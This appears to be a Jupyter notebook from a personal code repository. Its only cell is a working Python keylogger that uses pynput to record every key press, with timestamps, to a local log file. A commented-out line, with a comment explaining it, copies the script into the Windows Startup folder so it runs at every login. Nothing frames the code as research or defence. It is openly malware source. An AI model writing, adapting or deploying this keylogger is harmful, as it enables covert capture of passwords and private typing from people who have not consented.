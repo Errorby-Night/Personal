{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Listener\n",
    "\n",
    "import os\n",
    "import logging\n",
    "from shutil import copyfile\n",
    "\n",
    "username=os.getlogin()\n",
    "logging_directory=f\"D:/Books/logs/\"\n",
    "#copyfile('keylogger.py',f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/keylogger.py')\n",
    "#copyfile is used to make keylogger start at startup\n",
    "logging.basicConfig(filename=f\"{logging_directory}/logs.txt\",level=logging.DEBUG,format=\"%(asctime)s:%(message)s\")\n",
    "\n",
    "def key_handler(key):\n",
    "         logging.info(key)\n",
    "\n",
    "with Listener(on_press=key_handler) as listener:\n",
    "         listener.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
